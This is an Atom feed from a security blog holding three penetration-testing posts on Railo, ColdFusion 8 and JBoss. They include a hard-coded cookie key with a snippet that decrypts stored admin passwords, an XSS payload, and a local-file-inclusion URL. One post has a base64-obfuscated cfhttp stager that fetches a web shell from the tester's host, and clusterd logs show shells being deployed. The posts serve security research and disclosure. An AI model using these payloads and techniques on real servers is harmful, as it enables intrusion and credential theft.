<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: clusterd | forelsec]]></title>
  <link href="http://hatRiot.github.io/blog/categories/clusterd/atom.xml" rel="self"/>
  <link href="http://hatRiot.github.io/"/>
  <updated>2014-06-25T23:59:44-06:00</updated>
  <id>http://hatRiot.github.io/</id>
  <author>
    <name><![CDATA[Bryan Alexander]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[railo security - part one - intro]]></title>
    <link href="http://hatRiot.github.io/blog/2014/06/25/railo-security-part-one/"/>
    <updated>2014-06-25T15:00:00-06:00</updated>
    <id>http://hatRiot.github.io/blog/2014/06/25/railo-security-part-one</id>
    <content type="html"><![CDATA[<p><em>Part one &ndash; intro</em><br/>
<em>Part two</em><br/>
<em>Part three</em><br/>
<em>Part four</em></p>

<p><a href="http://getrailo.org/">Railo</a> is an open-source alternative to the popular Coldfusion application server, implementing a FOSSy CFML engine and application server.  It emulates Coldfusion in a variety of ways, mainly features coming straight from the CF world, along with several of it&rsquo;s own unique features (clustered servers, a plugin architecture, etc).  In this four-part series, we&rsquo;ll touch on how Railo, much like Coldfusion, can be used to gain access to a system or network of systems.  I will also be examining several pre-authentication RCE vulnerabilities discovered in the platform during this audit.  I&rsquo;ll be pimping <a href="https://github.com/hatRiot/clusterd">clusterd</a> throughout to exemplify how it can help achieve some of these goals.  These posts are the result of a combined effort between myself and Stephen Breen (@breenmachine).</p>

<p>I&rsquo;ll preface this post with a quick rundown on what we&rsquo;re working with; public versions of Railo run from versions 3.0 to 4.2, with 4.2.1 being the latest release as of posting.  The code is also freely available on <a href="github.com/getrailo/railo">Github</a>; much of this post&rsquo;s code samples have been taken from the 4.2 branch or the master.  Hashes:</p>

<p><code>
$ git branch
* master
$ git rev-parse master
694e8acf1a762431eab084da762a0abbe5290f49
</code></p>

<p>And a quick rundown of the code:</p>

<p>```
$ cloc ./</p>

<pre><code>3689 text files.
3571 unique files.                                          
 151 files ignored.
</code></pre>

<h2><a href="http://cloc.sourceforge.net">http://cloc.sourceforge.net</a> v 1.60  T=7.74 s (452.6 files/s, 60622.4 lines/s)</h2>

<h2>Language                       files          blank        comment           code</h2>

<p>Java                            2786          66639          69647         258015
ColdFusion                       315           5690           3089          35890
ColdFusion CFScript              352           4377            643          15856
XML                               22            526            563           5773
Javascript                        14             46            252            733
Ant                                4             38             70            176
DTD                                4            283            588            131
CSS                                5             52             16             77</p>

<h2>HTML                               1              0              0              1</h2>

<h2>SUM:                            3503          77651          74868         316652</h2>

<p>```</p>

<p>Railo has two separate administrative web interfaces; server and web.  The two interfaces segregate functionality out into these categories; managing the actual server and managing the content served up by the server.  Server is available at <code>http://localhost:8888/railo-context/admin/server.cfm</code> and web is available at <code>http://localhost:8888/railo-context/admin/web.cfm</code>.  Both interfaces are configured with a single, shared password that is set AFTER the site has been initialized.  That is, the first person to hit the web server gets to choose the password.</p>

<h4>Authentication</h4>

<p>As stated, authentication requires only a single password, but locks an IP address out if too many failed attempts are performed.  The exact logic for this is as follows (<code>web.cfm</code>):</p>

<p>```
<cfif loginPause and StructKeyExists(application,'lastTryToLogin') and IsDate(application.lastTryToLogin) and DateDiff("s",application.lastTryToLogin,now()) LT loginPause></p>

<pre><code>    &lt;cfset login_error="Login disabled until #lsDateFormat(DateAdd("s",loginPause,application.lastTryToLogin))# #lsTimeFormat(DateAdd("s",loginPause,application.lastTryToLogin),'hh:mm:ss')#"&gt;
&lt;cfelse&gt;
</code></pre>

<p>```</p>

<p>A <code>Remember Me For</code> setting allows an authenticated session to last until logout or for a specified amount of time.  In the event that a cookie is saved for X amount of time, Railo actually encrypts the user&rsquo;s password and stores it as the authentication cookie.  Here&rsquo;s the implementation of this:</p>

<p><code>
&lt;cfcookie expires="#DateAdd(form.rememberMe,1,now())#" name="railo_admin_pw_#ad#" value="#Encrypt(form["login_password"&amp;ad],cookieKey,"CFMX_COMPAT","hex")#"&gt;
</code></p>

<p>That&rsquo;s right; a static key, defined as <code>&lt;cfset cookieKey="sdfsdf789sdfsd"&gt;</code>, is used as the key to the CFMX_COMPAT encryption algorithm for encrypting and storing the user&rsquo;s password client-side.  This is akin to simply base64'ing the password, as symmetric key security is dependant upon the secrecy of this shared key.</p>

<p>To then verify authentication, the cookie is decrypted and compared to the current password (which is also known; more on this later):</p>

<p>```
<cfif not StructKeyExists(session,"password"&request.adminType) and StructKeyExists(cookie,'railo_admin_pw_#ad#')></p>

<pre><code>&lt;cfset fromCookie=true&gt;
&lt;cftry&gt;
    &lt;cfset session["password"&amp;ad]=Decrypt(cookie['railo_admin_pw_#ad#'],cookieKey,"CFMX_COMPAT","hex")&gt;
    &lt;cfcatch&gt;&lt;/cfcatch&gt;
&lt;/cftry&gt;
</code></pre>

<p></cfif>
```</p>

<p>For example, if my stored cookie was <code>RAILO_ADMIN_PW_WEB=6802AABFAA87A7</code>, we could decrypt this with a simple CFML page:</p>

<p><code>
&lt;cfset tmp=Decrypt("6802AABFAA87A7", "sdfsdf789sdfsd", "CFMX_COMPAT", "hex")&gt;
&lt;cfdump var="#tmp#"&gt;
</code></p>

<p>This would dump my plaintext password (which, in this case, is &ldquo;default&rdquo;).  This ups the ante with XSS, as we can essentially steal plaintext credentials via this vector.  Our cookie is graciously set without HTTPOnly or Secure: <code>Set-Cookie: RAILO_ADMIN_PW_WEB=6802AABFAA87A7;Path=/;Expires=Sun, 08-Mar-2015 06:42:31 GMT</code>._</p>

<p>Another worthy mention is the fact that the plaintext password is stored in the session struct, as shown below:</p>

<p><code>
&lt;cfset session["password"&amp;request.adminType]=form["login_password"&amp;request.adminType]&gt;
</code></p>

<p>In order to dump this, however, we&rsquo;d need to be able to write a CFM file (or code) within the context of web.cfm.  As a test, I&rsquo;ve placed a short CFM file on the host and set the error handler to invoke it.  <code>test.cfm</code>:</p>

<p><code>
&lt;cfdump var="#session#"&gt;
</code></p>

<p>We then set the template handler to this file:</p>

<p><img src="/images/posts/2014/railo/railo-error-handler.jpg"></p>

<p>If we now hit a non-existent page, <code>/railo-context/xx.cfm</code> for example, we&rsquo;ll trigger the cfm and get our plaintext password:</p>

<p><img src="/images/posts/2014/railo/railo-session-plaintext.jpg"></p>

<h4>XSS</h4>

<p>XSS is now awesome, because we can fetch the server&rsquo;s plaintext password.  Is there XSS in Railo?</p>

<p><img src="/images/posts/2014/railo/railo-xss.jpg"></p>

<p>Submitting to a CFM with malicious arguments triggers an error and injects unsanitized input.</p>

<p>Post-authentication search:</p>

<p><img src="/images/posts/2014/railo/railo-xss2.jpg"></p>

<p>Submitting malicious input into the search bar will effectively sanitize out greater than/less than signs, but not inside of the saved form.  Injecting <code>"&gt;&lt;/form&gt;&lt;img src=x onerror=alert(document.cookie)&gt;</code> will, of course, pop-up the cookie.</p>

<p>How about stored XSS?</p>

<p><img src="/images/posts/2014/railo/railo-xss3.jpg"></p>

<p>A malicious mapping will trigger whenever the page is loaded; the only caveat being that the path must start with a /, and you cannot use the script tag.  Trivial to get around with any number of different tags.</p>

<p>Speaking of, let&rsquo;s take a quick look at the sanitization routines.  They&rsquo;ve implemented their own routines inside of <code>ScriptProtect.java</code>, and it&rsquo;s a very simple blacklist:</p>

<p>```
  public static final String[] invalids=new String[]{</p>

<pre><code>    "object", "embed", "script", "applet", "meta", "iframe"
};
</code></pre>

<p>```</p>

<p>They iterate over these values and perform a simple compare, and if a <em>bad</em> tag is found, they simply replace it:</p>

<p>```</p>

<pre><code>if(compareTagName(tagName)) {
            if(sb==null) {
                sb=new StringBuffer();
                last=0;
            }
            sb.append(str.substring(last,index+1));
            sb.append("invalidTag");
            last=endIndex;
        }
</code></pre>

<p>```</p>

<p>It doesn&rsquo;t take much to evade this filter, as I&rsquo;ve already described.</p>

<p>CSRF kinda fits in here, how about CSRF?  Fortunately for users, and unfortunately for pentesters, there&rsquo;s not much we can do.  Although Railo does not enforce authentication for CFML/CFC pages, it does check read/write permissions on all accesses to the backend config file.  This is configured in the Server interface:</p>

<p><img src="/images/posts/2014/railo/railo-server-pw.jpg"></p>

<p>In the above image, if <code>Access Write</code> was configured to <code>open</code>, any user could submit modifications to the back-end configuration, including password resets, task scheduling, and more.  Though this is sufficiently locked down by default, this could provide a nice backdoor.</p>

<h4>Deploying</h4>

<p>Much like Coldfusion, Railo features a task scheduler that can be used to deploy shells.  A run of this in clusterd can be seen below:</p>

<p>```
$ ./clusterd.py -i192.168.1.219 -a railo -v4.1 &mdash;deploy ./src/lib/resources/cmd.cfml &mdash;deployer task &mdash;usr-auth default</p>

<pre><code>    clusterd/0.2.1 - clustered attack toolkit
        [Supporting 6 platforms]
</code></pre>

<p> [2014-05-01 10:04PM] Started at 2014-05-01 10:04PM
 [2014-05-01 10:04PM] Servers' OS hinted at windows
 [2014-05-01 10:04PM] Fingerprinting host &lsquo;192.168.1.219&rsquo;
 [2014-05-01 10:04PM] Server hinted at &lsquo;railo&rsquo;
 [2014-05-01 10:04PM] Checking railo version 4.1 Railo Server&hellip;
 [2014-05-01 10:04PM] Checking railo version 4.1 Railo Server Administrator&hellip;
 [2014-05-01 10:04PM] Checking railo version 4.1 Railo Web Administrator&hellip;
 [2014-05-01 10:04PM] Matched 3 fingerprints for service railo
 [2014-05-01 10:04PM]   Railo Server (version 4.1)
 [2014-05-01 10:04PM]   Railo Server Administrator (version 4.1)
 [2014-05-01 10:04PM]   Railo Web Administrator (version 4.1)
 [2014-05-01 10:04PM] Fingerprinting completed.
 [2014-05-01 10:04PM] This deployer (schedule_task) requires an external listening port (8000).  Continue? [Y/n] >
 [2014-05-01 10:04PM] Preparing to deploy cmd.cfml..
 [2014-05-01 10:04PM] Creating scheduled task&hellip;
 [2014-05-01 10:04PM] Task cmd.cfml created, invoking&hellip;
 [2014-05-01 10:04PM] Waiting for remote server to download file [8s]]
 [2014-05-01 10:04PM] cmd.cfml deployed to /cmd.cfml
 [2014-05-01 10:04PM] Cleaning up&hellip;
 [2014-05-01 10:04PM] Finished at 2014-05-01 10:04PM
```</p>

<p>This works almost identically to the Coldfusion scheduler, and should not be surprising.</p>

<p>One feature Railo has that isn&rsquo;t found in Coldfusion is the Extension or Plugin architecture; this allows custom extensions to run in the context of the Railo server and execute code and tags.  These extensions do not have access to the cfadmin tag (without authentication, that is), but we really don&rsquo;t need that for a simple web shell.  In the event that the Railo server is configured to not allow outbound traffic (hence rendering the Task Scheduler useless), this could be harnessed instead.</p>

<p>Railo allows extensions to be uploaded directly to the server, found here:</p>

<p><img src="/images/posts/2014/railo/railo-plugin-upload.jpg"></p>

<p>Developing a plugin is sort of confusing and not exacty clear via their provided Github documentation, however the simplest way to do this is grab a pre-existing package and simply replace one of the functions with a shell.</p>

<p>That about wraps up part one of our dive into Railo security; the remaining three parts will focus on several different vulnerabilities in the Railo framework, and how they can be lassoed together for pre-authentication RCE.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[LFI to shell in Coldfusion 6-10]]></title>
    <link href="http://hatRiot.github.io/blog/2014/04/02/lfi-to-stager-payload-in-coldfusion/"/>
    <updated>2014-04-02T15:10:04-06:00</updated>
    <id>http://hatRiot.github.io/blog/2014/04/02/lfi-to-stager-payload-in-coldfusion</id>
    <content type="html"><![CDATA[<p>ColdFusion has <a href="http://www.blackhatlibrary.net/Coldfusion_hacking">several</a> very popular LFI&rsquo;s that are often used to fetch CF hashes, which can then be passed or cracked/reversed.  A lesser use of this LFI, one that I haven&rsquo;t seen documented as of yet, is actually obtaining a shell.  When you can&rsquo;t crack or pass, what&rsquo;s left?</p>

<p>The less-than-obvious solution is to exploit CFML&rsquo;s parser, which acts much in the same way that PHP does when used in HTML.  You can embed PHP into any HTML page, at any location, because of the way the PHP interpreter searches a document for executable code.  This is the foundational basis of log poisoning.  CFML acts in much the same way, and we can use these LFI&rsquo;s to inject CFML and execute it on the remote system.</p>

<p>Let&rsquo;s begin by first identifying the LFI; I&rsquo;ll be using ColdFusion 8 as example.  CF8&rsquo;s LFI lies in the locale parameter:</p>

<p><code>
http://192.168.1.219:8500/CFIDE/administrator/enter.cfm?local=../../../../../../../../ColdFusion8\logs\application.log%00en
</code></p>

<p>When exploited, this will dump the contents of <code>application.log</code>, a logging file that stores error messages.</p>

<p><img src="/images/posts/2014/cf_log.jpg"></p>

<p>We can write to this file by triggering an error, such as attempting to access a nonexistent CFML page.  This log also fails to sanitize data, allowing us to inject any sort of characters we want; including CFML code.</p>

<p>The idea for this is to inject a simple stager payload that will then pull down and store our real payload; in this case, a web shell (something like fuze).  The stager I came up with is as follows:</p>

<p><code>
&lt;cfhttp method='get' url='#ToString(ToBinary('aHR0cDovLzE5Mi4xNjguMS45Nzo4MDAwL2NtZC5jZm1s'))#' path='#ExpandPath(ToString(ToBinary('Li4vLi4v')))#' file='cmd.cfml'&gt;
</code></p>

<p>The <code>cfhttp</code> tag is used to execute an HTTP request for our real payload, the URL of which is base64&rsquo;d to avoid some encoding issues with forward slashes.  We then expand the local path to <code>../../</code> which drops us into <code>wwwroot</code>, which is the first directory accessible from the web server.</p>

<p>Once the stager is injected, we only need to exploit the LFI to retrieve the log file and execute our CFML code:</p>

<p><img src="/images/posts/2014/cf_log_fetch.jpg"></p>

<p>Which we can then access from the root directory:</p>

<p><img src="/images/posts/2014/cf_log_exec.jpg"></p>

<p>A quick run of this in clusterd:</p>

<p>```
$ ./clusterd.py -i 192.168.1.219 -a coldfusion -p8500 -v8 &mdash;deployer lfi_stager &mdash;deploy ./src/lib/resources/cmd.cfml</p>

<pre><code>    clusterd/0.2.1 - clustered attack toolkit
        [Supporting 5 platforms]
</code></pre>

<p> [2014-04-02 11:28PM] Started at 2014-04-02 11:28PM
 [2014-04-02 11:28PM] Servers' OS hinted at windows
 [2014-04-02 11:28PM] Fingerprinting host &lsquo;192.168.1.219&rsquo;
 [2014-04-02 11:28PM] Server hinted at &lsquo;coldfusion&rsquo;
 [2014-04-02 11:28PM] Checking coldfusion version 8.0 ColdFusion Manager&hellip;
 [2014-04-02 11:28PM] Matched 1 fingerprints for service coldfusion
 [2014-04-02 11:28PM]   ColdFusion Manager (version 8.0)
 [2014-04-02 11:28PM] Fingerprinting completed.
 [2014-04-02 11:28PM] Injecting stager&hellip;
 [2014-04-02 11:28PM] Waiting for remote server to download file [7s]]
 [2014-04-02 11:28PM] cmd.cfml deployed at /cmd.cfml
 [2014-04-02 11:28PM] Finished at 2014-04-02 11:28PM</p>

<p>```</p>

<p>The downside to this method is remnance in a log file, which cannot be purged unless the CF server is shutdown (except in CF10).  It also means that the CFML file, if using the web shell, will be hanging around the filesystem.  An alternative is to inject a web shell that exists on-demand, that is, check if an argument is provided to the LFI and only parse and execute then.</p>

<p>A working deployer for this can be found in the latest release of clusterd (v0.2.1).  It is also worth noting that this method is applicable to other CFML engines; details on that, and a working proof of concept, in the near future.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Fetching JBoss MBean method hashes]]></title>
    <link href="http://hatRiot.github.io/blog/2014/01/26/fetching-jboss-mbean-method-hashes/"/>
    <updated>2014-01-26T01:24:19-07:00</updated>
    <id>http://hatRiot.github.io/blog/2014/01/26/fetching-jboss-mbean-method-hashes</id>
    <content type="html"><![CDATA[<p>Matasano published <a href="http://www.matasano.com/research/OWASP3011_Luca.pdf">one</a> of <a href="https://www.redteam-pentesting.de/en/publications/jboss/-bridging-the-gap-between-the-enterprise-and-you-or-whos-the-jboss-now">two</a> canonical papers on JBoss exploitation.  While working on a fresh new tool, I came across the JMXInvokerServlet technique, which uses serialized Java requests to deploy to remote MBeans.  This uses a specific object hash to route the JMX request to the correct MBean; in our case, the gold is jboss.jmx:name=Invoker.</p>

<p>In this paper, Matasano provides the hash for JBoss 4.0.3SP1, but does not list any others, nor show how it derived this.  After perusing the code, however, I found it to be quite simple, and have developed a simple method for fetching hashes of not only the Invoker MBean, but any listed in the JBoss registry.</p>

<p>To extract these values, we simply deploy a WAR file that dumps the entirety of the Registry, which is used for hash lookups when routing requests.  This can can be seen below:</p>

<p>```
&lt;%@ page import=&ldquo;org.jboss.system.Registry&rdquo;%>
&lt;%@ page import=&ldquo;java.io.*&rdquo;%>
&lt;%@ page import=&ldquo;java.util.Map&rdquo;%>
&lt;%@ page import=&ldquo;java.util.Iterator&rdquo;%>
&lt;%</p>

<pre><code>Iterator it = Registry.entries.entrySet().iterator();
while (it.hasNext()){
    Map.Entry pairs = (Map.Entry)it.next();
    out.println(pairs.getKey() + " = " + pairs.getValue() + "&lt;br/&gt;");
    it.remove();
}
</code></pre>

<p>%>
```</p>

<p>When deployed and executed on my local 4.0.5.GA JBoss server, we get:</p>

<p><img class="center" src="/images/posts/2014/jb_hash.jpg"></p>

<p>With this, we&rsquo;ve fetched the hash for the Invoker MBean as well as every other invokable MBean in the registry.  This value appears to be common across all 3.x and 4.x JBoss instances.  However, when run against JBoss 5.x/6.x instances, the following is returned:</p>

<p><img class="center" src="/images/posts/2014/jb_hash_6x.jpg"></p>

<p>This change is due to the way look-ups are performed in 5.x; instead of the key being an Integer (hash), the key is now an Object, as shown below:</p>

<p><code>
public static Map&lt;Object, Object&gt; entries = new ConcurrentHashMap&lt;Object, Object&gt;();
</code></p>

<p>To further enumerate this, we can iterate over the class methods and pull all of their hashes and hash codes:</p>

<p>```
&lt;%@ page import=&ldquo;java.io.*&rdquo;%>
&lt;%@ page import=&ldquo;java.util.Map&rdquo;%>
&lt;%@ page import=&ldquo;java.util.Iterator&rdquo;%>
&lt;%@ page import=&ldquo;java.lang.reflect.Method&rdquo;%>
&lt;%@ page import=&ldquo;org.jboss.system.Registry&rdquo;%>
&lt;%@ page import=&ldquo;javax.management.ObjectName&rdquo;%>
&lt;%@ page import=&ldquo;org.jboss.invocation.MarshalledInvocation&rdquo;%>
&lt;%</p>

<pre><code>Iterator it = Registry.entries.entrySet().iterator();
while (it.hasNext()){
    Map.Entry pairs = (Map.Entry)it.next();
    out.println(pairs.getKey() + " = " + pairs.getValue() + "&lt;br/&gt;");

    // check for ObjectName
    if (pairs.getKey() instanceof ObjectName){
        Long hash;
        Method[] methods = pairs.getValue().getClass().getMethods();
        for (int m = 0; m &lt; methods.length; ++m){
            Method method = methods[m];
            hash = new Long(MarshalledInvocation.calculateHash(method));
            out.println("Method: " + method + "  Hash: " + hash + " (" + method.hashCode() + ")" + "&lt;br/&gt;");
        }
    }

    out.println("Key class: " + pairs.getKey().getClass() + "&lt;br/&gt;");
    it.remove();
}
</code></pre>

<p>%>
```</p>

<p>Which gives us:</p>

<p><img class="center" src="/images/posts/2014/jb_6x_methods.jpg"></p>

<p>Judging by this information, it doesn&rsquo;t appear that we can remotely invoke the same way we did with 3.x/4.x.  This is the fundamental issue with several of the available open source JBoss tools (Metasploit); none of them take into account the changes between different versions of JBoss.</p>

<p>Although I have yet to discover a way to map requests to the invoker (I&rsquo;m not entirely sure its possible) in these later versions, I have a suspicion that we may be able to map these requests by serializing objects out.  More on this, and my exploitation tool, soon.</p>
]]></content>
  </entry>
  
</feed>
